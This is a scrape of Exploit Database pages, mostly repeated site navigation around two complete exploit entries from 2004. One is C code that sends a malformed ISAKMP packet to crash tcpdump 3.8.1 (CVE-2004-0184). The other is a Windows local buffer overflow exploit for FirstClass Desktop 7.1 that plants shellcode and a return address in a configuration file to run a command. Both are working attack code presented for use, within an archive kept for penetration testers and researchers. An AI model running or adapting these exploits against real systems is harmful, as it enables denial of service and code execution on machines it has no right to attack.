*)dest);}CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 171
tcpdump - ISAKMP Identification Payload Integer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDtcpdump - ISAKMP Identification Payload Integer OverflowEDB-ID:171CVE:2004-0184EDB Verified:Author:Rapid7Type:remoteExploit:/Platform:LinuxDate:2004-04-05Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** tcpdump packet sniffer* Integer underflow in ISAKMP Identification payload* denial of service vulnerability* proof of concept code* version 1.0 (Apr 02 2004)* CVE-ID: CAN-2004-0184** by Remi Denis-Courmont < exploit at simphalampin dot com >*   www simphalempin com dev* Remi Denis-Courmont is not responsible for the misuse of the* source code provided hereafter.** This vulnerability was found by:*   Rapid7, LLC Security Advisory - www rapid7 com* whose original advisory may be fetched from:*   www rapid7 com advisories R7-0017 html** Vulnerable:*  - tcpdump 3.8.1** Not vulnerable:*  - tcpdump 3.8.3** NOTES:*   The vulnerability cannot be exploited to cause a denial of service* with the Debian's tcpdump packages as it was partly fixed as part of* the fix for earlier known CAN-2003-0108 vulnerability, though the bug* is still present. That may be the case for other vendors which were* not investigated.**   tcpdump must be run with a verbosity level of at least 3:* # tcpdump -vvv* Otherwise, no denial of service will occur.*/#include <string.h>#include <stdio.h>#include <sys/types.h>#include <unistd.h>#include <sys/socket.h>#include <netdb.h>static const char packet[] =/* ISAKMP header */"\x00\x00\x00\x00\x00\x00\x00\x00" /* Initiator cookie */"\x00\x00\x00\x00\x00\x00\x00\x00" /* Responder cookie */"\x05"			/* Next payload: Identification */"\x10"			/* Version: 1.0 */"\x01"			/* Exchange type */"\x00"			/* Flags */"\x00\x00\x00\x00"	/* Message ID */"\x00\x00\x00\x24"	/* Length *//* ISAKMP Identification payload */"\x00"			/* Next payload: none */"\x00"			/* Reserved */"\x00\x05"		/* Payload length (incorrect) */"\x20"			/* ID type (unknown) */"\x00\x00\x00"		/* DOI */;static intsend_evil_packet (const struct addrinfo *r){int fd;size_t len;fd = socket (r->ai_family, r->ai_socktype, r->ai_protocol);if (fd == -1){perror ("Socket error");return 1;}len = sizeof (packet) - 1;if (sendto (fd, packet, len, 0, r->ai_addr, r->ai_addrlen) != len){perror ("Packet sending error");close (fd);return 1;}puts ("Packet sent!");close (fd);return 0;}static intproof (const char *hostname){struct addrinfo *res;int check;{struct addrinfo help;memset (&help, 0, sizeof (help));help.ai_socktype = SOCK_DGRAM;check = getaddrinfo (hostname, "isakmp", &help, &res);}if (check == 0){struct addrinfo *ptr;for (ptr = res; ptr != NULL; ptr = ptr->ai_next)check |= send_evil_packet (ptr);freeaddrinfo (res);return check;}fprintf (stderr, "%s: %s\n", hostname, gai_strerror (check));return -1;}static voidusage (const char *path){fprintf (stderr, "Usage: %s <hostname/IP>\n", path);}intmain (int argc, char *argv[]){puts ("tcpdump Integer underflow in ISAKMP Identification payload\n""proof of concept code\n""Copyright (C) Remi Denis-Courmont 2004 ""<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70""\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");if (argc != 2){usage (argv[0]);return 2;}return proof (argv[1]) ? 1 : 0;}// milw0rm.com [2004-04-05]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 172
FirstClass Desktop 7.1 - Local Buffer Overflow - Windows local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDFirstClass Desktop 7.1 - Local Buffer OverflowEDB-ID:172CVE:EDB Verified:Author:I2S-LaBType:localExploit:/Platform:WindowsDate:2004-04-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/***********************************************************++++++++++++++++++++++++++++++++++++++++++++++++++++#####################################################           FirstClass Desktop 7.1 (latest) buffer overflow exploit               #####################################################Discovered and coded by I2S-LaB.URL     : http://www.I2S-LaB.comcontact : contact[at]I2S-LaB.com++++++++++++++++++++++++++++++++++++++++++++++++++++Compile it with cl.exe (VC++6)***********************************************************/#include <windows.h>void main (int argc, char *argv[]){HANDLE FCP;DWORD NumberOfBytesWritten;unsigned char *p,FC_FILE[] = "Local Network.FCP",PATH[]   = "C:\\Program Files\\FirstClass\\Fcp\\",rawData[] =/////////////////////////////////////////////////////////////////// FC file data/////////////////////////////////////////////////////////////////"\x43\x4F\x4E\x4E\x54\x59\x50\x45\x20\x3D\x20\x38\x0D\x0A\x46\x43""\x50\x45\x4E\x43\x52\x59\x50\x54\x20\x3D\x20\x31\x0D\x0A\x44\x4C""\x53\x45\x4E\x44\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x45\x52\x52\x53""\x20\x3D\x20\x30\x0D\x0A\x44\x4C\x52\x43\x56\x20\x3D\x20\x30\x0D""\x0A\x4D\x44\x4D\x44\x42\x47\x20\x3D\x20\x30\x0D\x0A\x53\x4C\x44""\x42\x47\x20\x3D\x20\x30\x0D\x0A\x54\x43\x50\x54\x58\x57\x49\x4E""\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52\x58\x42""\x55\x46\x20\x3D\x20\x31\x30\x30\x30\x30\x0D\x0A\x54\x43\x50\x52""\x45\x4D\x50\x4F\x52\x54\x20\x3D\x20\x35\x31\x30\x0D\x0A\x50\x52""\x4F\x58\x59\x50\x4F\x52\x54\x20\x3D\x20\x22"/////////////////////////////////////////////////////////////////// MASS NOP LIKE : 'A' = inc ecxcclient Specific shellcode [78 bytes]*****************************************************************:00401006 EB47                    jmp 0040104F:00401008 5A                      pop edx:00401009 33FF                    xor edi, edi:0040100B 8BEC                    mov ebp, esp:0040100D 57                      push edi:0040100E 52                      push edx:0040100F 57                      push edi:00401010 6845786563              push 63657845:00401015 4F                      dec edi:00401016 81EFFFA89691            sub edi, 9196A8FF:0040101C 57                      push edi:0040101D 68454C3332              push 32334C45:00401022 684B45524E              push 4E52454B:00401027 8D5DE4                  lea ebx, dword ptr [ebp-1C]:0040102A 53                      push ebx:0040102B 33FF                    xor edi, edi:0040102D 81EF589D9DFF            sub edi, FF9D9D58:00401033 FF17                    call dword ptr [edi]:00401035 8D5DED                  lea ebx, dword ptr [ebp-13]:00401038 53                      push ebx:00401039 50                      push eax:0040103A 6681F75103              xor di, 0351:0040103F 4F                      dec edi:00401040 FF17                    call dword ptr [edi]:00401042 6A01                    push 00000001:00401044 FF75F8                  push [ebp-08]:00401047 FFD0                    call eax:00401049 6683EF4C                sub di, 004C:0040104D FFD7                    call edi:0040104F E8B4FFFFFF              call 00401008************************************************************/"\xEB\x47\x5A\x33\xFF\x8B\xEC\x57\x52\x57\x68\x45\x78\x65\x63\x4F""\x81\xEF\xFF\xA8\x96\x91\x57\x68\x45\x4C\x33\x32\x68\x4B\x45\x52""\x4E\x8D\x5D\xE4\x53\x33\xFF\x81\xEF\x58\x9D\x9D\xFF\xFF\x17\x8D""\x5D\xED\x53\x50\x66\x81\xF7\x51\x03\x4F\xFF\x17\x6A\x01\xFF\x75""\xF8\xFF\xD0\x66\x83\xEF\x4C\xFF\xD7\xE8\xB4\xFF\xFF\xFF""calc.exe & " // to execute////////////////////////////////////////////////////////////////// OTHER DATA////////////////////////////////////////////////////////////////"\x22\x0A\x0D\x0A\x50\x52\x4F\x58\x59\x41\x44\x44\x52\x20""\x3D\x20\x22\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x45\x45\x45""\x45\x44\x44"/////////////////////////////////////////////////////////////////// Return Address/////////////////////////////////////////////////////////////////"\x5f\x75\xC2\x00";// Bannerprintf ("###############################################\n""FirstClass Client local buffer overflow Exploit\n""###############################################\n""Discovered & coded by I2S-LaB.\n\n""URL  : http://www.I2S-LaB.com\n""MAIL : Contact[at]I2S-LaB.com\n\n");if ( !argv[1]) argv[1] = FC_FILE;(argc > 2 ) ? (p = argv[2]) : (p = PATH);if ( !(SetCurrentDirectory( p ) ) ){printf ("cannot set current directory to %s\nexiting.\n", p);ExitProcess(0);}if (!lstrcmpi (argv[1], "/restore") )printf ("Restore the backup file...%s\n",CopyFile ("Local Network.BAK", FC_FILE, FALSE) ? "ok" : "Error : backup file not found!\n");else if ( !lstrcmpi (argv[1], "/run")){printf ("Saving the Local Network file...%s\n",CopyFile (FC_FILE, "Local Network.BAK", TRUE) ? "ok" : "Backup file cannot be made");printf ("Opening the Local Network file...");FCP = CreateFile (FC_FILE, GENERIC_WRITE,FILE_SHARE_WRITE, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);if (FCP == INVALID_HANDLE_VALUE){printf ("cannot open Local Network file, exiting!\n");ExitProcess (-1);}printf ("ok\nWriting the Local Network File...%s\n",WriteFile (FCP, rawData, strlen (rawData) + 1, &NumberOfBytesWritten, NULL) ? "ok" : "Write file error!");}else printf ("usage : %s /RUN | /RESTORE [path to Local Network.FCP]\n\n""/RUN     : launch the xploit against \"Local Network.FCP\"\n""/RESTORE : Restore the previous \"Local Network.FCP\"\n\n""[path to Local Network.FCP] : Optional,\ndefine the path of the \"Local Network.FCP\" to exploit.\n""Default is %s\n", argv[0], PATH);}// milw0rm.com [2004-04-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function 